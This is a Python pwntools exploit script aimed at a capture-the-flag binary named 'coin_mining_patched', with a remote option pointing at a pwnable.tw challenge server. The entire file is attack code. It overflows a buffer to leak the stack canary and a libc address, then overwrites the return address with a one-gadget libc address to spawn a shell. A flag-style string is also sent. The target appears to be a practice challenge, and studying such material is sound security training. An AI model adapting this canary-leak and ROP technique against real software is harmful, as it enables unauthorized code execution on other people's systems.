#!/usr/bin/env python3

from pwn import *

exe = ELF("./coin_mining_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./coin_mining_patched")
    gdb.attach(p,'''''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./coin_mining_patched', checksec=False)

p.sendlineafter(b"Greet, do you want some coin?", b"1")

###############
# LEAK_CANARY #
###############

path_2 = b"a"*(0x88)
p.sendlineafter(b"Guess what coin I will give you:", path_2)
p.recvline()
canary = int.from_bytes(p.recv(7),"little") << 8
print("[+]Canry:    ", hex(canary))

#############
# LEAK_LIBC #
#############

path_2 = b"a"*(0x87+0x20 + 0x70)
p.sendlineafter(b"Try again:", path_2)
p.recvline()
libc.address = int.from_bytes(p.recv(6),"little") - 275593 - 3924650
print("[+]Libc_base     ", hex(libc.address))

#############
# ROP_CHAIN #
#############

og1 = 0x4f2c5+ libc.address 
path_2 = b"a"*(0x88) + p64(canary) + p64(0x1) + p64(og1)
p.sendlineafter(b"Try again:", path_2)

path = b"notHMCUS-CTF{a_coin_must_be_here}\n"
p.sendafter(b"Try again:", path + b"\x00")
'''
'''
p.interactive()
